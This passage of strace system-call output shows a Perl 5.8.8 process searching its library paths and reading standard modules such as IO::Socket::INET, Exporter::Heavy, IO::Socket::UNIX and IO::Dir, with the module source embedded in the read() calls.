my $sock = shift;\n    @_ == 1 ? $sock->getsockopt(SOL_SOCKET,@_)\n\t    : $sock->setsockopt(SOL_SOCKET,@_);\n}\n\nsub atmark {\n    @_ == 1 or croak \'usage: $sock->atmark()\';\n    my($sock) = @_;\n    sockatmark($sock);\n}\n\nsub timeout {\n    @_ == 1 || @_ == 2 or croak \'usage: $sock->timeout([VALUE])\';\n    my($sock,$val) = @_;\n    my $r = ${*$sock}{\'io_socket_timeout\'};\n\n    ${*$sock}{\'io_socket_timeout\'} = defined $val ? 0 + $val : $val\n\tif(@_ == 2);\n\n    $r;\n}\n\nsub sockdomain {\n    @_ == 1 or croak \'usage: $sock->sockdomain()\';\n    my $sock = shift;\n    ${*$sock}{\'io_socket_domain\'};\n}\n\nsub socktype {\n    @_ == 1 or croak \'usage: $sock->socktype()\';\n    my $sock = shift;\n    ${*$sock}{\'io_socket_type\'}\n}\n\nsub protocol {\n    @_ == 1 or croak \'usage: $sock->protocol()\';\n    my($sock) = @_;\n    ${*$sock}{\'io_socket_proto\'};\n}\n\n1;\n\n__END__\n\n", 4096) = 2603
18439 12:54:35.900898 _llseek(7, 6698, [6698], SEEK_SET) = 0
18439 12:54:35.900919 _llseek(7, 0, [6698], SEEK_CUR) = 0
18439 12:54:35.900930 close(7)          = 0
18439 12:54:35.900950 stat64("/etc/perl/IO/Socket/INET.pmc", 0xbff784cc) = -1 ENOENT (No such file or directory)
18439 12:54:35.900964 stat64("/etc/perl/IO/Socket/INET.pm", 0xbff783dc) = -1 ENOENT (No such file or directory)
18439 12:54:35.900979 stat64("/usr/local/lib/perl/5.8.8/IO/Socket/INET.pmc", 0xbff784cc) = -1 ENOENT (No such file or directory)
18439 12:54:35.900992 stat64("/usr/local/lib/perl/5.8.8/IO/Socket/INET.pm", 0xbff783dc) = -1 ENOENT (No such file or directory)
18439 12:54:35.901006 stat64("/usr/local/share/perl/5.8.8/IO/Socket/INET.pmc", 0xbff784cc) = -1 ENOENT (No such file or directory)
18439 12:54:35.901020 stat64("/usr/local/share/perl/5.8.8/IO/Socket/INET.pm", 0xbff783dc) = -1 ENOENT (No such file or directory)
18439 12:54:35.901034 stat64("/usr/lib/perl5/IO/Socket/INET.pmc", 0xbff784cc) = -1 ENOENT (No such file or directory)
18439 12:54:35.901046 stat64("/usr/lib/perl5/IO/Socket/INET.pm", 0xbff783dc) = -1 ENOENT (No such file or directory)
18439 12:54:35.901060 stat64("/usr/share/perl5/IO/Socket/INET.pmc", 0xbff784cc) = -1 ENOENT (No such file or directory)
18439 12:54:35.901073 stat64("/usr/share/perl5/IO/Socket/INET.pm", 0xbff783dc) = -1 ENOENT (No such file or directory)
18439 12:54:35.901086 stat64("/usr/lib/perl/5.8/IO/Socket/INET.pmc", 0xbff784cc) = -1 ENOENT (No such file or directory)
18439 12:54:35.901100 stat64("/usr/lib/perl/5.8/IO/Socket/INET.pm", {st_mode=S_IFREG|0644, st_size=6497, ...}) = 0
18439 12:54:35.901122 open("/usr/lib/perl/5.8/IO/Socket/INET.pm", O_RDONLY|O_LARGEFILE) = 7
18439 12:54:35.901146 ioctl(7, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbff781e8) = -1 ENOTTY (Inappropriate ioctl for device)
18439 12:54:35.901159 _llseek(7, 0, [0], SEEK_CUR) = 0
18439 12:54:35.901177 read(7, "# IO::Socket::INET.pm\n#\n# Copyright (c) 1997-8 Graham Barr <gbarr@pobox.com>. All rights reserved.\n# This program is free software; you can redistribute it and/or\n# modify it under the same terms as Perl itself.\n\npackage IO::Socket::INET;\n\nuse strict;\nour(@ISA, $VERSION);\nuse IO::Socket;\nuse Socket;\nuse Carp;\nuse Exporter;\nuse Errno;\n\n@ISA = qw(IO::Socket);\n$VERSION = \"1.29\";\n\nmy $EINVAL = exists(&Errno::EINVAL) ? Errno::EINVAL() : 1;\n\nIO::Socket::INET->register_domain( AF_INET );\n\nmy %socket_type = ( tcp  => SOCK_STREAM,\n\t\t    udp  => SOCK_DGRAM,\n\t\t    icmp => SOCK_RAW\n\t\t  );\n\nsub new {\n    my $class = shift;\n    unshift(@_, \"PeerAddr\") if @_ == 1;\n    return $class->SUPER::new(@_);\n}\n\nsub _sock_info {\n  my($addr,$port,$proto) = @_;\n  my $origport = $port;\n  my @proto = ();\n  my @serv = ();\n\n  $port = $1\n\tif(defined $addr && $addr =~ s,:([\\w\\(\\)/]+)$,,);\n\n  if(defined $proto  && $proto =~ /\\D/) {\n    if(@proto = getprotobyname($proto)) {\n      $proto = $proto[2] || undef;\n    }\n    else {\n      $@ = \"Bad protocol \'$proto\'\";\n      return;\n    }\n  }\n\n  if(defined $port) {\n    my $defport = ($port =~ s,\\((\\d+)\\)$,,) ? $1 : undef;\n    my $pnum = ($port =~ m,^(\\d+)$,)[0];\n\n    @serv = getservbyname($port, $proto[0] || \"\")\n\tif ($port =~ m,\\D,);\n\n    $port = $serv[2] || $defport || $pnum;\n    unless (defined $port) {\n\t$@ = \"Bad service \'$origport\'\";\n\treturn;\n    }\n\n    $proto = (getprotobyname($serv[3]))[2] || undef\n\tif @serv && !$proto;\n  }\n\n return ($addr || undef,\n\t $port || undef,\n\t $proto || undef\n\t);\n}\n\nsub _error {\n    my $sock = shift;\n    my $err = shift;\n    {\n      local($!);\n      my $title = ref($sock).\": \";\n      $@ = join(\"\", $_[0] =~ /^$title/ ? \"\" : $title, @_);\n      close($sock)\n\tif(defined fileno($sock));\n    }\n    $! = $err;\n    return undef;\n}\n\nsub _get_addr {\n    my($sock,$addr_str, $multi) = @_;\n    my @addr;\n    if ($multi && $addr_str !~ /^\\d+(?:\\.\\d+){3}$/) {\n\t(undef, undef, undef, undef, @addr) = gethostbyname($addr_str);\n    } else {\n\tmy $h = inet_aton($addr_str);\n\tpush(@addr, $h) if defined $h;\n    }\n    @addr;\n}\n\nsub configure {\n    my($sock,$arg) = @_;\n    my($lport,$rport,$laddr,$raddr,$proto,$type);\n\n    $arg->{LocalAddr} = $arg->{LocalHost}\n\tif exists $arg->{LocalHost} && !exists $arg->{LocalAddr};\n\n    ($laddr,$lport,$proto) = _sock_info($arg->{LocalAddr},\n\t\t\t\t\t$arg->{LocalPort},\n\t\t\t\t\t$arg->{Proto})\n\t\t\tor return _error($sock, $!, $@);\n\n    $laddr = defined $laddr ? inet_aton($laddr)\n\t\t\t    : INADDR_ANY;\n\n    return _error($sock, $EINVAL, \"Bad hostname \'\",$arg->{LocalAddr},\"\'\")\n\tunless(defined $laddr);\n\n    $arg->{PeerAddr} = $arg->{PeerHost}\n\tif exists $arg->{PeerHost} && !exists $arg->{PeerAddr};\n\n    unless(exists $arg->{Listen}) {\n\t($raddr,$rport,$proto) = _sock_info($arg->{PeerAddr},\n\t\t\t\t\t    $arg->{PeerPort},\n\t\t\t\t\t    $proto)\n\t\t\tor return _error($sock, $!, $@);\n    }\n\n    $proto ||= (getprotobyname(\'tcp\'))[2];\n\n    my $pname = (getprotobynumber($proto))[0];\n    $type = $arg->{Type} || $socket_type{lc $pname};\n\n    my @raddr = ();\n\n    if(defined $raddr) {\n\t@raddr = $sock->_get_addr($raddr, $arg->{MultiHomed});\n\treturn _error($sock, $EINVAL, \"Bad hostname \'\",$arg->{PeerAddr},\"\'\")\n\t    unless @raddr;\n    }\n\n    while(1) {\n\n\t$sock->socket(AF_INET, $type, $proto) or\n\t    return _error($sock, $!, \"$!\");\n\n        if (defined $arg->{Blocking}) {\n\t    defined $sock->blocking($arg->{Blocking})\n\t\tor return _error($sock, $!, \"$!\");\n\t}\n\n\tif ($arg->{Reuse} || $arg->{ReuseAddr}) {\n\t    $sock->sockopt(SO_REUSEADDR,1) or\n\t\t    return _error($sock, $!, \"$!\");\n\t}\n\n\tif ($arg->{ReusePort}) {\n\t    $sock->sockopt(SO_REUSEPORT,1) or\n\t\t    return _error($sock, $!, \"$!\");\n\t}\n\n\tif ($arg->{Broadcast}) {\n\t\t$sock->sockopt(SO_BROADCAST,1) or\n\t\t    return _error($sock, $!, \"$!\");\n\t}\n\n\tif($lport || ($laddr ne INADDR_ANY) || exists $arg->{Listen}) {\n\t    $sock->bind($lport || 0, $laddr) or\n\t\t    return _error($sock, $!, \"$!\");\n\t}\n\n\tif(exists $arg->{Listen}) {\n\t    $sock->listen($arg->{Listen} || 5) or\n\t\treturn _error($sock, $!, \"$!\");\n\t    last;\n\t}\n\n \t# don\'t try to connect unless we\'re given a PeerAddr\n \tlast unless e", 4096) = 4096
18439 12:54:35.901500 stat64("/etc/perl/Exporter/Heavy.pmc", 0xbff7801c) = -1 ENOENT (No such file or directory)
18439 12:54:35.901516 stat64("/etc/perl/Exporter/Heavy.pm", 0xbff77f2c) = -1 ENOENT (No such file or directory)
18439 12:54:35.901530 stat64("/usr/local/lib/perl/5.8.8/Exporter/Heavy.pmc", 0xbff7801c) = -1 ENOENT (No such file or directory)
18439 12:54:35.901543 stat64("/usr/local/lib/perl/5.8.8/Exporter/Heavy.pm", 0xbff77f2c) = -1 ENOENT (No such file or directory)
18439 12:54:35.901557 stat64("/usr/local/share/perl/5.8.8/Exporter/Heavy.pmc", 0xbff7801c) = -1 ENOENT (No such file or directory)
18439 12:54:35.901570 stat64("/usr/local/share/perl/5.8.8/Exporter/Heavy.pm", 0xbff77f2c) = -1 ENOENT (No such file or directory)
18439 12:54:35.901585 stat64("/usr/lib/perl5/Exporter/Heavy.pmc", 0xbff7801c) = -1 ENOENT (No such file or directory)
18439 12:54:35.901597 stat64("/usr/lib/perl5/Exporter/Heavy.pm", 0xbff77f2c) = -1 ENOENT (No such file or directory)
18439 12:54:35.901611 stat64("/usr/share/perl5/Exporter/Heavy.pmc", 0xbff7801c) = -1 ENOENT (No such file or directory)
18439 12:54:35.901623 stat64("/usr/share/perl5/Exporter/Heavy.pm", 0xbff77f2c) = -1 ENOENT (No such file or directory)
18439 12:54:35.901645 stat64("/usr/lib/perl/5.8/Exporter/Heavy.pmc", 0xbff7801c) = -1 ENOENT (No such file or directory)
18439 12:54:35.901660 stat64("/usr/lib/perl/5.8/Exporter/Heavy.pm", 0xbff77f2c) = -1 ENOENT (No such file or directory)
18439 12:54:35.901673 stat64("/usr/share/perl/5.8/Exporter/Heavy.pmc", 0xbff7801c) = -1 ENOENT (No such file or directory)
18439 12:54:35.901687 stat64("/usr/share/perl/5.8/Exporter/Heavy.pm", {st_mode=S_IFREG|0644, st_size=6252, ...}) = 0
18439 12:54:35.901709 open("/usr/share/perl/5.8/Exporter/Heavy.pm", O_RDONLY|O_LARGEFILE) = 9
18439 12:54:35.901724 ioctl(9, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbff77d38) = -1 ENOTTY (Inappropriate ioctl for device)
18439 12:54:35.901739 _llseek(9, 0, [0], SEEK_CUR) = 0
18439 12:54:35.901757 read(9, "package Exporter::Heavy;\n\nuse strict;\nno strict \'refs\';\n\n# On one line so MakeMaker will see it.\nrequire Exporter;  our $VERSION = $Exporter::VERSION;\n$Carp::Internal{\"Exporter::Heavy\"} = 1;\n\n#\n# We go to a lot of trouble not to \'require Carp\' at file scope,\n#  because Carp requires Exporter, and something has to give.\n#\n\nsub _rebuild_cache {\n    my ($pkg, $exports, $cache) = @_;\n    s/^&// foreach @$exports;\n    @{$cache}{@$exports} = (1) x @$exports;\n    my $ok = \\@{\"${pkg}::EXPORT_OK\"};\n    if (@$ok) {\n\ts/^&// foreach @$ok;\n\t@{$cache}{@$ok} = (1) x @$ok;\n    }\n}\n\nsub heavy_export {\n\n    # First make import warnings look like they\'re coming from the \"use\".\n    local $SIG{__WARN__} = sub {\n\tmy $text = shift;\n\tif ($text =~ s/ at \\S*Exporter\\S*.pm line \\d+.*\\n//) {\n\t    require Carp;\n\t    local $Carp::CarpLevel = 1;\t# ignore package calling us too.\n\t    Carp::carp($text);\n\t}\n\telse {\n\t    warn $text;\n\t}\n    };\n    local $SIG{__DIE__} = sub {\n\trequire Carp;\n\tlocal $Carp::CarpLevel = 1;\t# ignore package calling us too.\n\tCarp::croak(\"$_[0]Illegal null symbol in \\@${1}::EXPORT\")\n\t    if $_[0] =~ /^Unable to create sub named \"(.*?)::\"/;\n    };\n\n    my($pkg, $callpkg, @imports) = @_;\n    my($type, $sym, $cache_is_current, $oops);\n    my($exports, $export_cache) = (\\@{\"${pkg}::EXPORT\"},\n                                   $Exporter::Cache{$pkg} ||= {});\n\n    if (@imports) {\n\tif (!%$export_cache) {\n\t    _rebuild_cache ($pkg, $exports, $export_cache);\n\t    $cache_is_current = 1;\n\t}\n\n\tif (grep m{^[/!:]}, @imports) {\n\t    my $tagsref = \\%{\"${pkg}::EXPORT_TAGS\"};\n\t    my $tagdata;\n\t    my %imports;\n\t    my($remove, $spec, @names, @allexports);\n\t    # negated first item implies starting with default set:\n\t    unshift @imports, \':DEFAULT\' if $imports[0] =~ m/^!/;\n\t    foreach $spec (@imports){\n\t\t$remove = $spec =~ s/^!//;\n\n\t\tif ($spec =~ s/^://){\n\t\t    if ($spec eq \'DEFAULT\'){\n\t\t\t@names = @$exports;\n\t\t    }\n\t\t    elsif ($tagdata = $tagsref->{$spec}) {\n\t\t\t@names = @$tagdata;\n\t\t    }\n\t\t    else {\n\t\t\twarn qq[\"$spec\" is not defined in %${pkg}::EXPORT_TAGS];\n\t\t\t++$oops;\n\t\t\tnext;\n\t\t    }\n\t\t}\n\t\telsif ($spec =~ m:^/(.*)/$:){\n\t\t    my $patn = $1;\n\t\t    @allexports = keys %$export_cache unless @allexports; # only do keys once\n\t\t    @names = grep(/$patn/, @allexports); # not anchored by default\n\t\t}\n\t\telse {\n\t\t    @names = ($spec); # is a normal symbol name\n\t\t}\n\n\t\twarn \"Import \".($remove ? \"del\":\"add\").\": @names \"\n\t\t    if $Exporter::Verbose;\n\n\t\tif ($remove) {\n\t\t   foreach $sym (@names) { delete $imports{$sym} } \n\t\t}\n\t\telse {\n\t\t    @imports{@names} = (1) x @names;\n\t\t}\n\t    }\n\t    @imports = keys %imports;\n\t}\n\n        my @carp;\n\tforeach $sym (@imports) {\n\t    if (!$export_cache->{$sym}) {\n\t\tif ($sym =~ m/^\\d/) {\n\t\t    $pkg->VERSION($sym); # inherit from UNIVERSAL\n\t\t    # If the version number was the only thing specified\n\t\t    # then we should act as if nothing was specified:\n\t\t    if (@imports == 1) {\n\t\t\t@imports = @$exports;\n\t\t\tlast;\n\t\t    }\n\t\t    # We need a way to emulate \'use Foo ()\' but still\n\t\t    # allow an easy version check: \"use Foo 1.23, \'\'\";\n\t\t    if (@imports == 2 and !$imports[1]) {\n\t\t\t@imports = ();\n\t\t\tlast;\n\t\t    }\n\t\t} elsif ($sym !~ s/^&// || !$export_cache->{$sym}) {\n\t\t    # Last chance - see if they\'ve updated EXPORT_OK since we\n\t\t    # cached it.\n\n\t\t    unless ($cache_is_current) {\n\t\t\t%$export_cache = ();\n\t\t\t_rebuild_cache ($pkg, $exports, $export_cache);\n\t\t\t$cache_is_current = 1;\n\t\t    }\n\n\t\t    if (!$export_cache->{$sym}) {\n\t\t\t# accumulate the non-exports\n\t\t\tpush @carp,\n\t\t\t  qq[\"$sym\" is not exported by the $pkg module\\n];\n\t\t\t$oops++;\n\t\t    }\n\t\t}\n\t    }\n\t}\n\tif ($oops) {\n\t    require Carp;\n\t    Carp::croak(\"@{carp}Can\'t continue after import errors\");\n\t}\n    }\n    else {\n\t@imports = @$exports;\n    }\n\n    my($fail, $fail_cache) = (\\@{\"${pkg}::EXPORT_FAIL\"},\n                              $Exporter::FailCache{$pkg} ||= {});\n\n    if (@$fail) {\n\tif (!%$fail_cache) {\n\t    # Build cache of symbols. Optimise the lookup by adding\n\t    # barewords twice... both with and without a leading &.\n\t    # (Technique could be applied to $export_cac", 4096) = 4096
18439 12:54:35.902440 read(9, "he at cost of memory)\n\t    my @expanded = map { /^\\w/ ? ($_, \'&\'.$_) : $_ } @$fail;\n\t    warn \"${pkg}::EXPORT_FAIL cached: @expanded\" if $Exporter::Verbose;\n\t    @{$fail_cache}{@expanded} = (1) x @expanded;\n\t}\n\tmy @failed;\n\tforeach $sym (@imports) { push(@failed, $sym) if $fail_cache->{$sym} }\n\tif (@failed) {\n\t    @failed = $pkg->export_fail(@failed);\n\t    foreach $sym (@failed) {\n                require Carp;\n\t\tCarp::carp(qq[\"$sym\" is not implemented by the $pkg module ],\n\t\t\t\"on this architecture\");\n\t    }\n\t    if (@failed) {\n\t\trequire Carp;\n\t\tCarp::croak(\"Can\'t continue after import errors\");\n\t    }\n\t}\n    }\n\n    warn \"Importing into $callpkg from $pkg: \",\n\t\tjoin(\", \",sort @imports) if $Exporter::Verbose;\n\n    foreach $sym (@imports) {\n\t# shortcut for the common case of no type character\n\t(*{\"${callpkg}::$sym\"} = \\&{\"${pkg}::$sym\"}, next)\n\t    unless $sym =~ s/^(\\W)//;\n\t$type = $1;\n\t*{\"${callpkg}::$sym\"} =\n\t    $type eq \'&\' ? \\&{\"${pkg}::$sym\"} :\n\t    $type eq \'$\' ? \\${\"${pkg}::$sym\"} :\n\t    $type eq \'@\' ? \\@{\"${pkg}::$sym\"} :\n\t    $type eq \'%\' ? \\%{\"${pkg}::$sym\"} :\n\t    $type eq \'*\' ?  *{\"${pkg}::$sym\"} :\n\t    do { require Carp; Carp::croak(\"Can\'t export symbol: $type$sym\") };\n    }\n}\n\nsub heavy_export_to_level\n{\n      my $pkg = shift;\n      my $level = shift;\n      (undef) = shift;\t\t\t# XXX redundant arg\n      my $callpkg = caller($level);\n      $pkg->export($callpkg, @_);\n}\n\n# Utility functions\n\nsub _push_tags {\n    my($pkg, $var, $syms) = @_;\n    my @nontag = ();\n    my $export_tags = \\%{\"${pkg}::EXPORT_TAGS\"};\n    push(@{\"${pkg}::$var\"},\n\tmap { $export_tags->{$_} ? @{$export_tags->{$_}} \n                                 : scalar(push(@nontag,$_),$_) }\n\t\t(@$syms) ? @$syms : keys %$export_tags);\n    if (@nontag and $^W) {\n\t# This may change to a die one day\n\trequire Carp;\n\tCarp::carp(join(\", \", @nontag).\" are not tags of $pkg\");\n    }\n}\n\nsub heavy_require_version {\n    my($self, $wanted) = @_;\n    my $pkg = ref $self || $self;\n    return ${pkg}->VERSION($wanted);\n}\n\nsub heavy_export_tags {\n  _push_tags((caller)[0], \"EXPORT\",    \\@_);\n}\n\nsub heavy_export_ok_tags {\n  _push_tags((caller)[0], \"EXPORT_OK\", \\@_);\n}\n\n1;\n", 4096) = 2156
18439 12:54:35.902653 brk(0x829c000)    = 0x829c000
18439 12:54:35.902908 read(9, "", 4096) = 0
18439 12:54:35.902924 close(9)          = 0
18439 12:54:35.903642 read(7, "xists($arg->{PeerAddr});\n \n        $raddr = shift @raddr;\n\n\treturn _error($sock, $EINVAL, \'Cannot determine remote port\')\n\t\tunless($rport || $type == SOCK_DGRAM || $type == SOCK_RAW);\n\n\tlast\n\t    unless($type == SOCK_STREAM || defined $raddr);\n\n\treturn _error($sock, $EINVAL, \"Bad hostname \'\",$arg->{PeerAddr},\"\'\")\n\t    unless defined $raddr;\n\n#        my $timeout = ${*$sock}{\'io_socket_timeout\'};\n#        my $before = time() if $timeout;\n\n\tundef $@;\n        if ($sock->connect(pack_sockaddr_in($rport, $raddr))) {\n#            ${*$sock}{\'io_socket_timeout\'} = $timeout;\n            return $sock;\n        }\n\n\treturn _error($sock, $!, $@ || \"Timeout\")\n\t    unless @raddr;\n\n#\tif ($timeout) {\n#\t    my $new_timeout = $timeout - (time() - $before);\n#\t    return _error($sock,\n#                         (exists(&Errno::ETIMEDOUT) ? Errno::ETIMEDOUT() : $EINVAL),\n#                         \"Timeout\") if $new_timeout <= 0;\n#\t    ${*$sock}{\'io_socket_timeout\'} = $new_timeout;\n#        }\n\n    }\n\n    $sock;\n}\n\nsub connect {\n    @_ == 2 || @_ == 3 or\n       croak \'usage: $sock->connect(NAME) or $sock->connect(PORT, ADDR)\';\n    my $sock = shift;\n    return $sock->SUPER::connect(@_ == 1 ? shift : pack_sockaddr_in(@_));\n}\n\nsub bind {\n    @_ == 2 || @_ == 3 or\n       croak \'usage: $sock->bind(NAME) or $sock->bind(PORT, ADDR)\';\n    my $sock = shift;\n    return $sock->SUPER::bind(@_ == 1 ? shift : pack_sockaddr_in(@_))\n}\n\nsub sockaddr {\n    @_ == 1 or croak \'usage: $sock->sockaddr()\';\n    my($sock) = @_;\n    my $name = $sock->sockname;\n    $name ? (sockaddr_in($name))[1] : undef;\n}\n\nsub sockport {\n    @_ == 1 or croak \'usage: $sock->sockport()\';\n    my($sock) = @_;\n    my $name = $sock->sockname;\n    $name ? (sockaddr_in($name))[0] : undef;\n}\n\nsub sockhost {\n    @_ == 1 or croak \'usage: $sock->sockhost()\';\n    my($sock) = @_;\n    my $addr = $sock->sockaddr;\n    $addr ? inet_ntoa($addr) : undef;\n}\n\nsub peeraddr {\n    @_ == 1 or croak \'usage: $sock->peeraddr()\';\n    my($sock) = @_;\n    my $name = $sock->peername;\n    $name ? (sockaddr_in($name))[1] : undef;\n}\n\nsub peerport {\n    @_ == 1 or croak \'usage: $sock->peerport()\';\n    my($sock) = @_;\n    my $name = $sock->peername;\n    $name ? (sockaddr_in($name))[0] : undef;\n}\n\nsub peerhost {\n    @_ == 1 or croak \'usage: $sock->peerhost()\';\n    my($sock) = @_;\n    my $addr = $sock->peeraddr;\n    $addr ? inet_ntoa($addr) : undef;\n}\n\n1;\n\n__END__\n\n", 4096) = 2401
18439 12:54:35.907513 _llseek(7, 6496, [6496], SEEK_SET) = 0
18439 12:54:35.907583 _llseek(7, 0, [6496], SEEK_CUR) = 0
18439 12:54:35.907620 close(7)          = 0
18439 12:54:35.907715 stat64("/etc/perl/IO/Socket/UNIX.pmc", 0xbff784cc) = -1 ENOENT (No such file or directory)
18439 12:54:35.907738 stat64("/etc/perl/IO/Socket/UNIX.pm", 0xbff783dc) = -1 ENOENT (No such file or directory)
18439 12:54:35.907753 stat64("/usr/local/lib/perl/5.8.8/IO/Socket/UNIX.pmc", 0xbff784cc) = -1 ENOENT (No such file or directory)
18439 12:54:35.907767 stat64("/usr/local/lib/perl/5.8.8/IO/Socket/UNIX.pm", 0xbff783dc) = -1 ENOENT (No such file or directory)
18439 12:54:35.907781 stat64("/usr/local/share/perl/5.8.8/IO/Socket/UNIX.pmc", 0xbff784cc) = -1 ENOENT (No such file or directory)
18439 12:54:35.907794 stat64("/usr/local/share/perl/5.8.8/IO/Socket/UNIX.pm", 0xbff783dc) = -1 ENOENT (No such file or directory)
18439 12:54:35.907809 stat64("/usr/lib/perl5/IO/Socket/UNIX.pmc", 0xbff784cc) = -1 ENOENT (No such file or directory)
18439 12:54:35.907821 stat64("/usr/lib/perl5/IO/Socket/UNIX.pm", 0xbff783dc) = -1 ENOENT (No such file or directory)
18439 12:54:35.907835 stat64("/usr/share/perl5/IO/Socket/UNIX.pmc", 0xbff784cc) = -1 ENOENT (No such file or directory)
18439 12:54:35.907847 stat64("/usr/share/perl5/IO/Socket/UNIX.pm", 0xbff783dc) = -1 ENOENT (No such file or directory)
18439 12:54:35.907861 stat64("/usr/lib/perl/5.8/IO/Socket/UNIX.pmc", 0xbff784cc) = -1 ENOENT (No such file or directory)
18439 12:54:35.907875 stat64("/usr/lib/perl/5.8/IO/Socket/UNIX.pm", {st_mode=S_IFREG|0644, st_size=1387, ...}) = 0
18439 12:54:35.907897 open("/usr/lib/perl/5.8/IO/Socket/UNIX.pm", O_RDONLY|O_LARGEFILE) = 7
18439 12:54:35.907912 ioctl(7, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbff781e8) = -1 ENOTTY (Inappropriate ioctl for device)
18439 12:54:35.907924 _llseek(7, 0, [0], SEEK_CUR) = 0
18439 12:54:35.907940 brk(0x82bd000)    = 0x82bd000
18439 12:54:35.907957 read(7, "# IO::Socket::UNIX.pm\n#\n# Copyright (c) 1997-8 Graham Barr <gbarr@pobox.com>. All rights reserved.\n# This program is free software; you can redistribute it and/or\n# modify it under the same terms as Perl itself.\n\npackage IO::Socket::UNIX;\n\nuse strict;\nour(@ISA, $VERSION);\nuse IO::Socket;\nuse Socket;\nuse Carp;\n\n@ISA = qw(IO::Socket);\n$VERSION = \"1.22\";\n$VERSION = eval $VERSION;\n\nIO::Socket::UNIX->register_domain( AF_UNIX );\n\nsub new {\n    my $class = shift;\n    unshift(@_, \"Peer\") if @_ == 1;\n    return $class->SUPER::new(@_);\n}\n\nsub configure {\n    my($sock,$arg) = @_;\n    my($bport,$cport);\n\n    my $type = $arg->{Type} || SOCK_STREAM;\n\n    $sock->socket(AF_UNIX, $type, 0) or\n\treturn undef;\n\n    if(exists $arg->{Local}) {\n\tmy $addr = sockaddr_un($arg->{Local});\n\t$sock->bind($addr) or\n\t    return undef;\n    }\n    if(exists $arg->{Listen} && $type != SOCK_DGRAM) {\n\t$sock->listen($arg->{Listen} || 5) or\n\t    return undef;\n    }\n    elsif(exists $arg->{Peer}) {\n\tmy $addr = sockaddr_un($arg->{Peer});\n\t$sock->connect($addr) or\n\t    return undef;\n    }\n\n    $sock;\n}\n\nsub hostpath {\n    @_ == 1 or croak \'usage: $sock->hostpath()\';\n    my $n = $_[0]->sockname || return undef;\n    (sockaddr_un($n))[0];\n}\n\nsub peerpath {\n    @_ == 1 or croak \'usage: $sock->peerpath()\';\n    my $n = $_[0]->peername || return undef;\n    (sockaddr_un($n))[0];\n}\n\n1; # Keep require happy\n\n__END__\n\n", 4096) = 1387
18439 12:54:35.908843 _llseek(7, 1386, [1386], SEEK_SET) = 0
18439 12:54:35.917157 _llseek(7, 0, [1386], SEEK_CUR) = 0
18439 12:54:35.917260 close(7)          = 0
18439 12:54:35.917363 stat64("/etc/perl/IO/Dir.pmc", 0xbff784cc) = -1 ENOENT (No such file or directory)
18439 12:54:35.917400 stat64("/etc/perl/IO/Dir.pm", 0xbff783dc) = -1 ENOENT (No such file or directory)
18439 12:54:35.917427 stat64("/usr/local/lib/perl/5.8.8/IO/Dir.pmc", 0xbff784cc) = -1 ENOENT (No such file or directory)
18439 12:54:35.917451 stat64("/usr/local/lib/perl/5.8.8/IO/Dir.pm", 0xbff783dc) = -1 ENOENT (No such file or directory)
18439 12:54:35.917468 stat64("/usr/local/share/perl/5.8.8/IO/Dir.pmc", 0xbff784cc) = -1 ENOENT (No such file or directory)
18439 12:54:35.917480 stat64("/usr/local/share/perl/5.8.8/IO/Dir.pm", 0xbff783dc) = -1 ENOENT (No such file or directory)
18439 12:54:35.917494 stat64("/usr/lib/perl5/IO/Dir.pmc", 0xbff784cc) = -1 ENOENT (No such file or directory)
18439 12:54:35.917506 stat64("/usr/lib/perl5/IO/Dir.pm", 0xbff783dc) = -1 ENOENT (No such file or directory)
18439 12:54:35.917520 stat64("/usr/share/perl5/IO/Dir.pmc", 0xbff784cc) = -1 ENOENT (No such file or directory)
18439 12:54:35.917532 stat64("/usr/share/perl5/IO/Dir.pm", 0xbff783dc) = -1 ENOENT (No such file or directory)
18439 12:54:35.917545 stat64("/usr/lib/perl/5.8/IO/Dir.pmc", 0xbff784cc) = -1 ENOENT (No such file or directory)
18439 12:54:35.917558 stat64("/usr/lib/perl/5.8/IO/Dir.pm", {st_mode=S_IFREG|0644, st_size=5318, ...}) = 0
18439 12:54:35.917579 open("/usr/lib/perl/5.8/IO/Dir.pm", O_RDONLY|O_LARGEFILE) = 7
18439 12:54:35.917594 ioctl(7, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbff781e8) = -1 ENOTTY (Inappropriate ioctl for device)
18439 12:54:35.917606 _llseek(7, 0, [0], SEEK_CUR) = 0
18439 12:54:35.917625 read(7, "# IO::Dir.pm\n#\n# Copyright (c) 1997-8 Graham Barr <gbarr@pobox.com>. All rights reserved.\n# This program is free software; you can redistribute it and/or\n# modify it under the same terms as Perl itself.\n\npackage IO::Dir;\n\nuse 5.006;\n\nuse strict;\nuse Carp;\nuse Symbol;\nuse Exporter;\nuse IO::File;\nour(@ISA, $VERSION, @EXPORT_OK);\nuse Tie::Hash;\nuse File::stat;\nuse File::Spec;\n\n@ISA = qw(Tie::Hash Exporter);\n$VERSION = \"1.05\";\n$VERSION = eval $VERSION;\n@EXPORT_OK = qw(DIR_UNLINK);\n\nsub DIR_UNLINK () { 1 }\n\nsub new {\n    @_ >= 1 && @_ <= 2 or croak \'usage: new IO::Dir [DIRNAME]\';\n    my $class = shift;\n    my $dh = gensym;\n    if (@_) {\n\tIO::Dir::open($dh, $_[0])\n\t    or return undef;\n    }\n    bless $dh, $class;\n}\n\nsub DESTROY {\n    my ($dh) = @_;\n    closedir($dh);\n}\n\nsub open {\n    @_ == 2 or croak \'usage: $dh->open(DIRNAME)\';\n    my ($dh, $dirname) = @_;\n    return undef\n\tunless opendir($dh, $dirname);\n    # a dir name should always have a \":\" in it; assume dirname is\n    # in current directory\n    $dirname = \':\' .  $dirname if ( ($^O eq \'MacOS\') && ($dirname !~ /:/) );\n    ${*$dh}{io_dir_path} = $dirname;\n    1;\n}\n\nsub close {\n    @_ == 1 or croak \'usage: $dh->close()\';\n    my ($dh) = @_;\n    closedir($dh);\n}\n\nsub read {\n    @_ == 1 or croak \'usage: $dh->read()\';\n    my ($dh) = @_;\n    readdir($dh);\n}\n\nsub seek {\n    @_ == 2 or croak \'usage: $dh->seek(POS)\';\n    my ($dh,$pos) = @_;\n    seekdir($dh,$pos);\n}\n\nsub tell {\n    @_ == 1 or croak \'usage: $dh->tell()\';\n    my ($dh) = @_;\n    telldir($dh);\n}\n\nsub rewind {\n    @_ == 1 or croak \'usage: $dh->rewind()\';\n    my ($dh) = @_;\n    rewinddir($dh);\n}\n\nsub TIEHASH {\n    my($class,$dir,$options) = @_;\n\n    my $dh = $class->new($dir)\n\tor return undef;\n\n    $options ||= 0;\n\n    